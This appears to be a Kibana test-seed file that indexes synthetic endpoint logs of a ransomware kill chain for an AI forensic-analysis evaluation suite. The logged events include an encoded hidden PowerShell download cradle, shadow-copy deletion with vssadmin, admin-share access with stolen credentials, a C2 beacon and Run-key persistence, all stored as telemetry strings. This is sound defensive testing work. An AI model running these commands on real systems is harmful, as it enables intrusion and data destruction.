/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

import type { Client } from '@elastic/elasticsearch';
import type { ToolingLog } from '@kbn/tooling-log';

/**
 * Forensic timeline seed for the endpoint-forensic-analysis smoke suite.
 *
 * The troubleshooting SCENARIOS in ./endpoint_data.ts stamp every document with a
 * single `now`, so they cannot exercise a chronological reconstruction. The forensic
 * skill's happy-path examples (patient zero, lateral movement, host timeline) require
 * an ORDERED kill-chain: `execute_esql` must return rows the model can sort by
 * `@timestamp` into a timeline. Without seeded events the "produces a chronological
 * narrative or ordered event list for the named host" criterion is unsatisfiable and
 * pins the timeline example at partial credit.
 *
 * One coherent narrative covers all three happy-path examples:
 *   WKSTN-RECV01 (patient zero, phishing) → lateral SMB/WMI hop → SRV-DC01 (domain
 *   controller ransomware + shadow-copy deletion). Every event carries a distinct
 *   `@timestamp` so an ascending sort is a real timeline.
 *
 * Agent ids use the dedicated `eval-agent-forensic-` prefix so cleanupForensicData()
 * reclaims them without touching the troubleshooting suite's `eval-agent-*` seeds.
 */

const FORENSIC_AGENT_PREFIX = 'eval-agent-forensic-';

export const FORENSIC_HOSTS = {
  /** Patient zero — receptionist workstation, first infection via phishing. */
  patientZero: 'WKSTN-RECV01',
  /** Lateral-movement target — the domain controller, ransomware detonation. */
  domainController: 'SRV-DC01',
} as const;

const AGENT_IDS = {
  [FORENSIC_HOSTS.patientZero]: `${FORENSIC_AGENT_PREFIX}wkstn-recv01`,
  [FORENSIC_HOSTS.domainController]: `${FORENSIC_AGENT_PREFIX}srv-dc01`,
} as const;

const WORKSTATION_OS = {
  name: 'Windows',
  version: '10.0.19045',
  type: 'windows',
  platform: 'windows',
  family: 'windows',
  full: 'Windows 10 Pro',
} as const;

const DC_OS = {
  name: 'Windows',
  version: '10.0.20348',
  type: 'windows',
  platform: 'windows',
  family: 'windows',
  full: 'Windows Server 2022',
} as const;

const PROCESS_INDEX = 'logs-endpoint.events.process-default';
const FILE_INDEX = 'logs-endpoint.events.file-default';
const NETWORK_INDEX = 'logs-endpoint.events.network-default';
const REGISTRY_INDEX = 'logs-endpoint.events.registry-default';

interface ForensicEvent {
  /** Minutes after the base time; must be unique per host to yield an ordered timeline. */
  offsetMinutes: number;
  host: keyof typeof AGENT_IDS;
  index: string;
  /** ECS body excluding `@timestamp`, `agent`, `elastic`, `host` (added by the seeder). */
  document: Record<string, unknown>;
}

const os = (host: keyof typeof AGENT_IDS) =>
  host === FORENSIC_HOSTS.domainController ? DC_OS : WORKSTATION_OS;

/**
 * Ordered ransomware kill chain. Offsets are strictly increasing so a
 * `SORT @timestamp` over either host reconstructs the attack narrative.
 */
const KILL_CHAIN: ForensicEvent[] = [
  // --- Patient zero: WKSTN-RECV01 initial access via phishing ---
  {
    offsetMinutes: 0,
    host: FORENSIC_HOSTS.patientZero,
    index: PROCESS_INDEX,
    document: {
      event: { category: ['process'], type: ['start'], kind: 'event' },
      process: {
        name: 'powershell.exe',
        pid: 4821,
        executable: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        command_line: 'powershell.exe -nop -w hidden -enc SQBFAFgAKABJAFcAUgAoACcAaAB0AHQAcAA6AC8A',
        parent: {
          name: 'OUTLOOK.EXE',
          pid: 3120,
          executable: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE',
        },
      },
      message: 'OUTLOOK.EXE spawned an encoded PowerShell command (phishing attachment macro).',
    },
  },
  {
    offsetMinutes: 2,
    host: FORENSIC_HOSTS.patientZero,
    index: FILE_INDEX,
    document: {
      event: { category: ['file'], type: ['creation'], kind: 'event' },
      file: {
        name: 'update.dll',
        path: 'C:\\Users\\Public\\update.dll',
        extension: 'dll',
        hash: { sha256: 'a3f5c9d1e8b74620fa1c0d5e2b9847361c0ded4488ab2f0e9a7c6b5d4e3f2a10' },
      },
      process: {
        name: 'powershell.exe',
        executable: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      },
      message: 'PowerShell dropped second-stage payload update.dll to a world-writable path.',
    },
  },
  {
    offsetMinutes: 5,
    host: FORENSIC_HOSTS.patientZero,
    index: NETWORK_INDEX,
    document: {
      event: { category: ['network'], type: ['connection', 'start'], kind: 'event' },
      network: { direction: 'outbound', transport: 'tcp', protocol: 'tls' },
      destination: { address: '185.220.101.42', ip: '185.220.101.42', port: 443 },
      process: { name: 'powershell.exe' },
      message: 'Outbound TLS beacon to known C2 185.220.101.42:443.',
    },
  },
  {
    offsetMinutes: 12,
    host: FORENSIC_HOSTS.patientZero,
    index: PROCESS_INDEX,
    document: {
      event: { category: ['process'], type: ['start'], kind: 'event' },
      process: {
        name: 'rundll32.exe',
        pid: 5102,
        executable: 'C:\\Windows\\System32\\rundll32.exe',
        command_line: 'rundll32.exe C:\\Users\\Public\\update.dll,DllMain',
        parent: { name: 'powershell.exe', pid: 4821 },
      },
      message: 'rundll32 loaded update.dll; process accessed lsass.exe memory (credential theft).',
    },
  },
  // --- Lateral movement: WKSTN-RECV01 -> SRV-DC01 ---
  {
    offsetMinutes: 20,
    host: FORENSIC_HOSTS.patientZero,
    index: NETWORK_INDEX,
    document: {
      event: { category: ['network'], type: ['connection', 'start'], kind: 'event' },
      network: { direction: 'outbound', transport: 'tcp', protocol: 'smb' },
      destination: { domain: FORENSIC_HOSTS.domainController, ip: '10.0.0.10', port: 445 },
      process: { name: 'rundll32.exe', pid: 5102 },
      message: 'SMB (445) connection from WKSTN-RECV01 to SRV-DC01 using stolen credentials.',
    },
  },
  {
    offsetMinutes: 22,
    host: FORENSIC_HOSTS.domainController,
    index: PROCESS_INDEX,
    document: {
      event: { category: ['process'], type: ['start'], kind: 'event' },
      process: {
        name: 'cmd.exe',
        pid: 8004,
        executable: 'C:\\Windows\\System32\\cmd.exe',
        command_line: 'cmd.exe /c whoami',
        parent: {
          name: 'wmiprvse.exe',
          pid: 2440,
          executable: 'C:\\Windows\\System32\\wbem\\wmiprvse.exe',
        },
      },
      message: 'Remote WMI execution on SRV-DC01: wmiprvse.exe spawned cmd.exe (lateral movement).',
    },
  },
  {
    offsetMinutes: 25,
    host: FORENSIC_HOSTS.domainController,
    index: PROCESS_INDEX,
    document: {
      event: { category: ['process'], type: ['start'], kind: 'event' },
      process: {
        name: 'net.exe',
        pid: 8110,
        executable: 'C:\\Windows\\System32\\net.exe',
        command_line: 'net use \\\\SRV-DC01\\C$ /user:CORP\\Administrator',
        parent: { name: 'cmd.exe', pid: 8004 },
      },
      message: 'Stolen CORP\\Administrator credentials used for admin share access on SRV-DC01.',
    },
  },
  // --- Persistence + impact: SRV-DC01 ransomware detonation ---
  {
    offsetMinutes: 30,
    host: FORENSIC_HOSTS.domainController,
    index: REGISTRY_INDEX,
    document: {
      event: { category: ['registry'], type: ['change'], kind: 'event' },
      registry: {
        path: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater',
        key: 'Updater',
        value: 'C:\\ProgramData\\svc.exe',
      },
      process: { name: 'cmd.exe', pid: 8004 },
      message: 'Run-key persistence added on SRV-DC01 pointing at C:\\ProgramData\\svc.exe.',
    },
  },
  {
    offsetMinutes: 35,
    host: FORENSIC_HOSTS.domainController,
    index: PROCESS_INDEX,
    document: {
      event: { category: ['process'], type: ['start'], kind: 'event' },
      process: {
        name: 'vssadmin.exe',
        pid: 8320,
        executable: 'C:\\Windows\\System32\\vssadmin.exe',
        command_line: 'vssadmin.exe delete shadows /all /quiet',
        parent: { name: 'svc.exe', pid: 8290 },
      },
      message: 'Volume shadow copies deleted on SRV-DC01 (ransomware anti-recovery).',
    },
  },
  {
    offsetMinutes: 40,
    host: FORENSIC_HOSTS.domainController,
    index: FILE_INDEX,
    document: {
      event: { category: ['file'], type: ['change'], kind: 'event' },
      file: {
        name: 'ntds.dit.locked',
        path: 'C:\\Windows\\NTDS\\ntds.dit.locked',
        extension: 'locked',
      },
      process: { name: 'svc.exe', pid: 8290 },
      message: 'Mass file encryption on SRV-DC01: files renamed with .locked extension.',
    },
  },
  {
    offsetMinutes: 42,
    host: FORENSIC_HOSTS.domainController,
    index: FILE_INDEX,
    document: {
      event: { category: ['file'], type: ['creation'], kind: 'event' },
      file: {
        name: 'README_RESTORE.txt',
        path: 'C:\\Users\\Public\\Desktop\\README_RESTORE.txt',
        extension: 'txt',
      },
      process: { name: 'svc.exe', pid: 8290 },
      message: 'Ransom note README_RESTORE.txt written on SRV-DC01.',
    },
  },
];

/**
 * Bulk-index the ordered kill chain into `logs-endpoint.events.*`. Idempotent when
 * paired with cleanupForensicData() in beforeAll (which reclaims by the
 * `eval-agent-forensic-` prefix only, leaving troubleshooting seeds intact).
 */
export async function seedForensicTimeline(
  { esClient }: { esClient: Client },
  log: ToolingLog,
  baseTime: Date = new Date(Date.now() - 3 * 60 * 60 * 1000)
): Promise<void> {
  const operations = KILL_CHAIN.flatMap((event) => {
    const agentId = AGENT_IDS[event.host];
    const timestamp = new Date(baseTime.getTime() + event.offsetMinutes * 60 * 1000).toISOString();
    const [, dataset] = event.index.match(/^logs-(endpoint\.events\.[a-z]+)-default$/) ?? [];

    return [
      { create: { _index: event.index } },
      {
        '@timestamp': timestamp,
        agent: { id: agentId, type: 'endpoint', version: '9.5.0-SNAPSHOT' },
        elastic: { agent: { id: agentId } },
        host: { name: event.host, hostname: event.host, os: os(event.host) },
        data_stream: dataset ? { type: 'logs', dataset, namespace: 'default' } : undefined,
        ...event.document,
        event: {
          ...(event.document.event as Record<string, unknown>),
          module: 'endpoint',
          dataset,
        },
      },
    ];
  });

  const response = await esClient.bulk({ operations, refresh: true });

  if (response.errors) {
    const firstError = response.items.find((item) => item.create?.error)?.create?.error;
    throw new Error(
      `seedForensicTimeline: bulk index failed: ${JSON.stringify(firstError ?? 'unknown error')}`
    );
  }

  log.info(
    `Seeded ${KILL_CHAIN.length} forensic kill-chain events across ${
      Object.keys(FORENSIC_HOSTS).length
    } hosts (${FORENSIC_HOSTS.patientZero} → ${FORENSIC_HOSTS.domainController}).`
  );
}
